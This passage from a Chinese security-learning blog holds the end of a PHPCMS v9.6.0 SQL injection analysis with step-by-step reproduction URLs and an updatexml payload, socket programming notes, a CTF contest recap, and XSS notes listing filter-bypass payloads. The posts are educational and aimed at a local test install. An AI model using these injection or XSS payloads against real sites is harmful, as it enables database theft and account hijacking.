    pc_base::load_app_func(&apos;global&apos;);
    $this-&gt;upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;);
    $this-&gt;upload_path = pc_base::load_config(&apos;system&apos;,&apos;upload_path&apos;);      
    $this-&gt;imgext = array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;jpeg&apos;);
    $this-&gt;userid = $_SESSION[&apos;userid&apos;] ? $_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;));
    $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&apos;roleid&apos;] ? 1 : 0;
    $this-&gt;groupid = param::get_cookie(&apos;_groupid&apos;) ? param::get_cookie(&apos;_groupid&apos;) : 8;
    //判断是否登录
    if(empty($this-&gt;userid)){
        showmessage(L(&apos;please_login&apos;,&apos;&apos;,&apos;member&apos;));
    }
}
</code></pre><p>这里通过判断$this-&gt;userid来测试用户是否登录,可以发现userid除了可以来自于cookie外还可以来自于$_POST[‘userid_flash’]中. 这里师傅们使用的生成这个加密后的$_POST[‘userid_flash’]的点在<code>/phpcms/modules/wap/index.php</code>文件中:</p>
<pre><code>function __construct() {        
    $this-&gt;db = pc_base::load_model(&apos;content_model&apos;);
    $this-&gt;siteid = isset($_GET[&apos;siteid&apos;]) &amp;&amp; (intval($_GET[&apos;siteid&apos;]) &gt; 0) ? intval(trim($_GET[&apos;siteid&apos;])) : (param::get_cookie(&apos;siteid&apos;) ? param::get_cookie(&apos;siteid&apos;) : 1);
    param::set_cookie(&apos;siteid&apos;,$this-&gt;siteid);  
    $this-&gt;wap_site = getcache(&apos;wap_site&apos;,&apos;wap&apos;);
    $this-&gt;types = getcache(&apos;wap_type&apos;,&apos;wap&apos;);
    $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
    define(&apos;WAP_SITEURL&apos;, $this-&gt;wap[&apos;domain&apos;] ? $this-&gt;wap[&apos;domain&apos;].&apos;index.php?&apos; : APP_PATH.&apos;index.php?m=wap&amp;siteid=&apos;.$this-&gt;siteid);
    if($this-&gt;wap[&apos;status&apos;]!=1) exit(L(&apos;wap_close_status&apos;));
}

//展示首页
public function init() {
    $WAP = $this-&gt;wap;
    $TYPE = $this-&gt;types;
    $WAP_SETTING = string2array($WAP[&apos;setting&apos;]);
    $GLOBALS[&apos;siteid&apos;] = $siteid = max($this-&gt;siteid,1);
    $template = $WAP_SETTING[&apos;index_template&apos;] ? $WAP_SETTING[&apos;index_template&apos;] : &apos;index&apos;;
    include template(&apos;wap&apos;, $template);
}
</code></pre><p>设置了一个siteid的cookie,可以利用这个cookie的值传入到之前的那个$_POST[‘userid_flash’]中.</p>
<h2 id="0x03-注入验证"><a href="#0x03-注入验证" class="headerlink" title="0x03 注入验证"></a>0x03 注入验证</h2><h3 id="Step1-获取之前的userid"><a href="#Step1-获取之前的userid" class="headerlink" title="Step1 获取之前的userid"></a>Step1 获取之前的userid</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>,获取cookie中的siteid值. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/1.png" alt="图片1"></p>
<h3 id="Step2-获取加密后的sql语句"><a href="#Step2-获取加密后的sql语句" class="headerlink" title="Step2 获取加密后的sql语句"></a>Step2 获取加密后的sql语句</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27+and+updatexml(1,concat(0x7e,database()),0x7e)%23%26m%3d1%26f%3dhaha%26modelid%3d2%26catid%3d7%26&amp;</code>,获取cookie中att_json值. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/2.png" alt="图片2"></p>
<h3 id="Step3-执行注入"><a href="#Step3-执行注入" class="headerlink" title="Step3 执行注入"></a>Step3 执行注入</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=加密后的字符串</code>,即可验证. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/3.png" alt="图片3"></p>
<h2 id="0x04-参考文件"><a href="#0x04-参考文件" class="headerlink" title="0x04 参考文件"></a>0x04 参考文件</h2><ul>
<li><a href="https://www.bertramc.cn/2017/06/16/34.html">【挖坟】PHPCMS v9.6.0 SQL注入</a></li>
<li><a href="http://www.venenof.com/index.php/archives/347/">PHPCMS V9.6.0注入分析</a></li>
</ul>
<h2 id="0x05-题外话"><a href="#0x05-题外话" class="headerlink" title="0x05 题外话"></a>0x05 题外话</h2><p>比赛求各位大佬们轻虐!</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/socket-structures/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/socket-structures/index.html" itemprop="url">
                  socket网络编程笔记 与地址相关的常见struct
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-11-27 20:51:20" itemprop="dateCreated datePublished" datetime="2017-11-27T20:51:20+08:00">2017-11-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h3 id="addrinfo"><a href="#addrinfo" class="headerlink" title="addrinfo"></a>addrinfo</h3><pre><code>struct addrinfo {
    int              ai_flags;     // AI_PASSIVE, AI_CANONNAME, etc.
    int              ai_family;    // AF_INET(ipv4), AF_INET6(ipv6), AF_UNSPEC
    int              ai_socktype;  // SOCK_STREAM, SOCK_DGRAM
    int              ai_protocol;  // use 0 for &quot;any&quot;
    size_t           ai_addrlen;   // size of ai_addr in bytes
    struct sockaddr *ai_addr;      // struct sockaddr_in or _in6
    char            *ai_canonname; // full canonical hostname
    struct addrinfo *ai_next;      // linked list, next node
};
</code></pre><ul>
<li>获取此结构的函数:getaddrinfo()</li>
</ul>
<h3 id="sockaddr"><a href="#sockaddr" class="headerlink" title="sockaddr"></a>sockaddr</h3><pre><code>struct sockaddr {
    unsigned short    sa_family;    // address family, AF_xxx
    char              sa_data[14];  // 14 bytes of protocol address,contains a destination address and port number for the socket. 
}; 
</code></pre><h3 id="sockaddr-in"><a href="#sockaddr-in" class="headerlink" title="sockaddr_in"></a>sockaddr_in</h3><pre><code>// (IPv4 only--see struct sockaddr_in6 for IPv6)
struct sockaddr_in {
    short int          sin_family;  // Address family, AF_INET
    unsigned short int sin_port;    // Port number
    struct in_addr     sin_addr;    // Internet address
    unsigned char      sin_zero[8]; // Same size as struct sockaddr
};
</code></pre><ul>
<li><strong>sin_zero</strong>(which is included to pad the structure to the length of a struct sockaddr) should be set to all zeros with the function <strong>memset()</strong></li>
<li><strong>sin_family</strong> corresponds to <strong>sa_family</strong> in a struct <strong>sockaddr</strong> and should be set to <strong>_AF_INET_</strong>.</li>
<li>the <strong>sin_port</strong> must be in <strong><em>Network Byte Order</em></strong> (by using <strong>htons()</strong>!)</li>
</ul>
<h3 id="in-addr"><a href="#in-addr" class="headerlink" title="in_addr"></a>in_addr</h3><pre><code>// (IPv4 only--see struct in6_addr for IPv6)
// Internet address (a structure for historical reasons)
struct in_addr {
    uint32_t s_addr; // that&apos;s a 32-bit int (4 bytes)
};
</code></pre><ul>
<li>used to be a union</li>
<li>referes to the 4-byte IP address</li>
</ul>
<h3 id="structs-in-ipv6-similar"><a href="#structs-in-ipv6-similar" class="headerlink" title="structs in ipv6(similar)"></a>structs in ipv6(similar)</h3><pre><code>// (IPv6 only--see struct sockaddr_in and struct in_addr for IPv4)
struct sockaddr_in6 {
    u_int16_t       sin6_family;   // address family, AF_INET6
    u_int16_t       sin6_port;     // port number, Network Byte Order
    u_int32_t       sin6_flowinfo; // IPv6 flow information
    struct in6_addr sin6_addr;     // IPv6 address
    u_int32_t       sin6_scope_id; // Scope ID
};
struct in6_addr {
    unsigned char   s6_addr[16];   // IPv6 address
};
</code></pre><h3 id="sockaddr-storage-a-structure-large-enough-to-hold-both-ipv4-and-ipv6-structrues"><a href="#sockaddr-storage-a-structure-large-enough-to-hold-both-ipv4-and-ipv6-structrues" class="headerlink" title="sockaddr_storage (a structure large enough to hold both ipv4 and ipv6 structrues)"></a>sockaddr_storage (a structure large enough to hold both ipv4 and ipv6 structrues)</h3><pre><code>struct sockaddr_storage {
    sa_family_t  ss_family;     // address family
    // all this is padding, implementation specific, ignore it:
    char      __ss_pad1[_SS_PAD1SIZE];
    int64_t   __ss_align;
    char      __ss_pad2[_SS_PAD2SIZE];
};
</code></pre><ul>
<li>you can cast it to a struct sockaddr_in or struct sockaddr_in6 if you wanna</li>
</ul>
<h2 id="manipulate-IP-address"><a href="#manipulate-IP-address" class="headerlink" title="manipulate IP address"></a>manipulate IP address</h2><h3 id="inet-pton-cast-string-form-to-binary-form"><a href="#inet-pton-cast-string-form-to-binary-form" class="headerlink" title="inet_pton(): cast string form to binary form"></a>inet_pton(): cast string form to binary form</h3><pre><code>struct sockaddr_in sa; // IPv4
struct sockaddr_in6 sa6; // IPv6
inet_pton(AF_INET, &quot;10.12.110.57&quot;, &amp;(sa.sin_addr)); // IPv4
inet_pton(AF_INET6, &quot;2001:db8:63b3:1::3490&quot;, &amp;(sa6.sin6_addr)); // IPv6
</code></pre><ul>
<li>old way: <strong>_inet_addr()_</strong> <strong>_inet_aton()_</strong> (not compatible with IPv6)</li>
</ul>
<h3 id="inet-ntop-cast-binary-from-to-string-from"><a href="#inet-ntop-cast-binary-from-to-string-from" class="headerlink" title="inet_ntop(): cast binary from to string from"></a>inet_ntop(): cast binary from to string from</h3><pre><code>// IPv4:
char ip4[INET_ADDRSTRLEN];
struct sockaddr_in sa;
// space to hold the IPv4 string
// pretend this is loaded with something
inet_ntop(AF_INET, &amp;(sa.sin_addr), ip4, INET_ADDRSTRLEN);
printf(&quot;The IPv4 address is: %s\n&quot;, ip4);
// IPv6:
char ip6[INET6_ADDRSTRLEN]; // space to hold the IPv6 string
struct sockaddr_in6 sa6;
// pretend this is loaded with something
inet_ntop(AF_INET6, &amp;(sa6.sin6_addr), ip6, INET6_ADDRSTRLEN);
printf(&quot;The address is: %s\n&quot;, ip6);
</code></pre><blockquote>
<p>only work with numeric IP addresses,won’t do any nameserver DNS lookup on a hostname. Use <strong><em>getaddrinfo()</em></strong> to do that.</p>
</blockquote>
<h2 id="Other-Notes"><a href="#Other-Notes" class="headerlink" title="Other Notes"></a>Other Notes</h2><ul>
<li><strong><em>Layered Network Model</em></strong><ul>
<li>Seven layers<ol>
<li><strong>Application</strong> (应用层)</li>
<li><strong>Presentaion</strong> (表示层)</li>
<li><strong>Session</strong> (会话层)</li>
<li><strong>Transport</strong> (传输层)</li>
<li><strong>Network</strong> (网络层)</li>
<li><strong>Data Link</strong> (数据链路层)</li>
<li><strong>Physical</strong> (物理层)</li>
</ol>
</li>
<li>Simplified Four Layers<ul>
<li><strong>Application Layer</strong>(应用层:telnet,ftp,etc.)</li>
<li><strong>Host-to-Host Layer</strong>(传输层:TCP UDP)</li>
<li><strong>Internet Layer</strong>(网络互连层:IP and routing)</li>
<li><strong>Network Access Layer</strong>(主机到网络层:Ethernet,wi-fi,whatever)</li>
</ul>
</li>
</ul>
</li>
<li>Some common IP addresses<ul>
<li>10.x.x.x<ul>
<li>only be used either of fully disconnected networks or the networks behind firewalls</li>
</ul>
</li>
<li>192.168.x.x x in range(0,256)</li>
<li>172.y.x.x y in rarnge(16,32)</li>
</ul>
</li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/tianyi6/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/tianyi6/index.html" itemprop="url">
                  天翼杯线下赛总结
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-10-27 08:19:41" itemprop="dateCreated datePublished" datetime="2017-10-27T08:19:41+08:00">2017-10-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>昨天打了场天翼杯线下赛，也算是第二次打线下赛了吧，跟着学长们混最后拿到了个第五名。比赛还是让萌新受益匪浅，也充分了解到自己的不足之处。欸，菜的一笔还得继续努力。那就写这篇文章重点来记录一下自己参加这次线下赛的感想吧。</p>
</blockquote>
<h2 id="1-Windows服务器管理方面不擅长"><a href="#1-Windows服务器管理方面不擅长" class="headerlink" title="1.Windows服务器管理方面不擅长"></a>1.Windows服务器管理方面不擅长</h2><p>之前较少接触windows服务器，这次线下赛有一台装有struts的windows服务器，经检测确实存在struts2046漏洞可以利用。然而获取shell之后需要获取远程桌面才能得到flag，由于windows的cmd玩的不是很熟所以试了半天还是gg了。。。。。。所以以后还是要<strong>拓展知识面</strong>。</p>
<h2 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h2><p>现场审计phpcms的漏洞，提前准备的一些POC由于没有仔细用过结果用的时候有的库没装。。。。试了半天也没试出来。。。。还是太菜了。。。。以后还是要多学学代码审计相关的知识，至少做到熟练一些主流cms的架构。</p>
<h2 id="3-linux运维"><a href="#3-linux运维" class="headerlink" title="3.linux运维"></a>3.linux运维</h2><p>有些重要命令还是不熟。。。。。。以后还得多学学。。。。。。</p>
<blockquote>
<p>总之个人认为线下赛还是对个人能力的全方位的考验，需要有扎实的功底和渗透运维技巧。菜的一笔。。。。还是去好好学习吧。。。。。。</p>
</blockquote>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/xss/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/xss/index.html" itemprop="url">
                  XSS
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-08-27 12:08:09" itemprop="dateCreated datePublished" datetime="2017-08-27T12:08:09+08:00">2017-08-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="整理sus沙龙以及xman的前端ppt的笔记"><a href="#整理sus沙龙以及xman的前端ppt的笔记" class="headerlink" title="整理sus沙龙以及xman的前端ppt的笔记"></a>整理sus沙龙以及xman的前端ppt的笔记</h4><hr>
<h2 id="0x01-JS能用来做什么"><a href="#0x01-JS能用来做什么" class="headerlink" title="0x01 JS能用来做什么"></a>0x01 JS能用来做什么</h2><ul>
<li>请求资源</li>
<li>提交表单</li>
<li>修改html</li>
<li>响应事件</li>
</ul>
<hr>
<h2 id="0x02-一个含有js的html文件是怎样变成一个动态网页的"><a href="#0x02-一个含有js的html文件是怎样变成一个动态网页的" class="headerlink" title="0x02 一个含有js的html文件是怎样变成一个动态网页的"></a>0x02 一个含有js的html文件是怎样变成一个动态网页的</h2><p><strong>浏览器解析方式</strong> 在HTML中有五类元素 <em> 语言的解析一般分为<code>词法分析（lexical analysis）</code>和<code>语法分析（Syntax analysis）</code>两个阶段，WebKit中的 html解析也不例外，本文主要讨论词法分析。 </em> 词法分析的任务是对输入字节流进行逐字扫描，根据构词规则识别单词和符号，分词。 <em> 在WebKit中，有两个类，同词法分析密切相关，它是<code>HTMLToken</code>和<code>HTMLTokenizer</code>类，可以简单将HTMLToken类理 解 为标记，HTMLTokenizer类理解为词法解析器。HTML词法解析的任务，就是将输入的字节流解析成一个个的<code>标记（HTMLToken）</code>，然后由 语法解析器进行下一步的分析。 \</em> 在XML/HTML的文档解析中，token这个词经常用到，我将其理解为一个<code>有完整语义的单元（也就是分出来的 “词”）</code>，一个元素通常对应于3 个 token，一个是<code>元素的起始标签</code>，一个是<code>元素的结束标签</code>，一个是元素的<code>内容</code>，这点同DOM树是不一样的，在DOM树上，起始标签和结束标签对应于一个元素节点，而元素内容对应另一个节点。 * 除了<code>起始标签(StartTag)</code>、<code>结束标签(EndTag)</code>和<code>元素内容（Character）</code>，HTML标签还有<code>DOCTYPE（文档类 型）</code>,<code>Comment（注释）</code>，<code>Uninitialized（默认类型）</code>和<code>EndOfFile（文档结束）</code>等类型，参见HTMLToken.h中的 Type枚举 <strong>在HTML中有五类元素：</strong></p>
<ol>
<li><strong>空元素(Void elements)</strong>，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</li>
<li><strong>原始文本元素(Raw text elements)</strong>，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li>
<li><strong>RCDATA元素(RCDATA elements)</strong>，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li>
<li><strong>外部元素(Foreign elements)</strong>，例如<code>MathML命名空间</code>或者<code>SVG命名空间</code>的元素</li>
<li><strong>基本元素(Normal elements)</strong>，即除了以上4种元素以外的元素</li>
</ol>
<p><strong>五类元素的区别如下：</strong></p>
<ol>
<li><strong>空元素</strong>，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li>
<li><strong>原始文本元素</strong>，可以容纳文本。</li>
<li><strong>RCDATA元素</strong>，可以容纳文本和字符引用。 （&amp;#60）</li>
<li><strong>外部元素</strong>，可以容纳文本、字符引用、CDATA段、其他元素和注释</li>
<li><strong>基本元素</strong>，可以容纳文本、字符引用、其他元素和注释</li>
</ol>
<blockquote>
<p>如果我们回头看HTML解析器的规则，其中有一种可以容纳字符引用的情况是“RCDATA状态中的字符引用”。 这意味着在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>标签中的字符引用会被HTML解析器解码。这里要再提醒一次，在解析这些字符 引用的过程中不会进入“标签开始状态”。这样就可以解释问题5了。另外，对RCDATA有个特殊的情况。在浏 览器解析RCDATA元素的过程中，解析器会进入<code>RCDATA状态</code>。在这个状态中，如果遇到<code>&lt;</code>字符，它会转 换到<code>RCDATA小于号状态</code>。如果<code>&lt;</code>字符后没有紧跟着<code>/</code>和对应的标签名，解析器会转换回<code>RCDATA状 态</code>。这意味着在RCDATA元素标签的内容中（例如<code>&lt;textarea&gt;</code>或<code>&lt;title&gt;</code>的内容中），唯一能够被解析器认做是 标签的就是<code>&lt;/textarea&gt;</code>或者<code>&lt;/title&gt;</code>。当然，这要看开始标签是哪一个。因此，在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;”</code>的内容中不会创建标签，就不会有脚本能够执行。</p>
</blockquote>
<hr>
<h2 id="0x03-XSS是什么"><a href="#0x03-XSS是什么" class="headerlink" title="0x03 XSS是什么"></a>0x03 XSS是什么</h2><p>恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.通过xss可以进行一系列的越权操作，或者窃取用户cookies从而登录用户账户。 <strong>说白了就是 插js, html耍流氓</strong></p>
<hr>
<h2 id="0x04-XSS的分类"><a href="#0x04-XSS的分类" class="headerlink" title="0x04 XSS的分类"></a>0x04 XSS的分类</h2><p><strong>反射型XSS：</strong></p>
<ul>
<li>恶意代码通常存在于URL中</li>
<li>需要用户去点击相应的链接才会触发，隐蔽性较差</li>
<li>而且，而且可能会被浏览器的XSS Filter干掉</li>
<li>流程：输入–输出</li>
</ul>
<p><strong>存储型XSS：</strong></p>
<ul>
<li>恶意代码通常存在于数据库中</li>
<li>用户浏览被植入payload的“正常页面”时即可触发，隐蔽性较 强，成功率高，稳定性好。</li>
<li>流程：输入–进入数据库–取出数据库–输出</li>
</ul>
<hr>
<h2 id="0x05-XSS漏洞挖掘技巧"><a href="#0x05-XSS漏洞挖掘技巧" class="headerlink" title="0x05 XSS漏洞挖掘技巧"></a>0x05 XSS漏洞挖掘技巧</h2><ul>
<li>输入在标签间的情况：测试<code>&lt;&gt;</code>是否被过滤或转义，若无则直接<code>&lt;img src=1 onerror=alert(1)&gt;</code></li>
<li>输入在script标签内：我们需要在保证内部JS语法正确的前提下，去插入我们的payload。 如果我们的输出在字符串内部，测试字符串能否被闭合。如果我 们无法闭合包裹字符串的引号，这个点就很难利用了。 可能的解决方案：可以控制两处输入且\可用、存在宽字节</li>
<li>输入在HTML属性内：首先查看属性是否有双引号包裹、没有则直接添加新的事件属性； 有双引号包裹则测试双引号是否可用，可用则闭合属性之后添加 新的事件属性； TIP：HTML的属性，如果被进行HTML实体编码(形如<code>&amp;#039</code>;<code>&amp;#x27</code>)，那么 HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编 码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构 造payload。</li>
<li>输出在JS中，空格被过滤：使用<code>/**/</code>代替空格。</li>
<li>输出在JS注释中： 设法插入换行符<code>%0A，</code>使其逃逸出来。</li>
<li>输入在JS字符串内： 可以利用JS的十六进制、八进制、unicode编码。</li>
<li>输入在src/href/action等属性内：可以利用<code>javascript:alert(1)</code>，以及 <code>data:text/html;base64;</code>加上base64编码后的HTML。</li>
<li>onxxx事件的js脚本可以用html编码来绕过对某些关键字的过滤。</li>
<li>Chrome下iframe自身的弹框姿势：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(2)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;alert(4)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line">*   坑点之自带HtmlEncode(转义)功能的标签：</span><br><span class="line">```html</span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>当我们的XSS payload位于这些标签中间时，并不会解析，除非我们把它们闭合掉。</p>
<hr>
<h2 id="0x06-XSS练习网站、资料"><a href="#0x06-XSS练习网站、资料" class="headerlink" title="0x06 XSS练习网站、资料"></a>0x06 XSS练习网站、资料</h2><ul>
<li><a href="http://xss-quiz.int21h.jp/">xss-quiz</a></li>
<li><a href="https://alf.nu/alert1">alert(1) to win</a></li>
<li><a href="http://prompt.ml/0">prompt(1) to win</a></li>
<li><a href="http://html5sec.org/">html5 Security Cheatsheet</a></li>
<li><a href="http://ssv.sebug.net/XSS_Cheat_Sheet">XSS Cheatsheet</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP XSS Filter Evasion Cheat Sheet</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/apache-order-allow/index.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
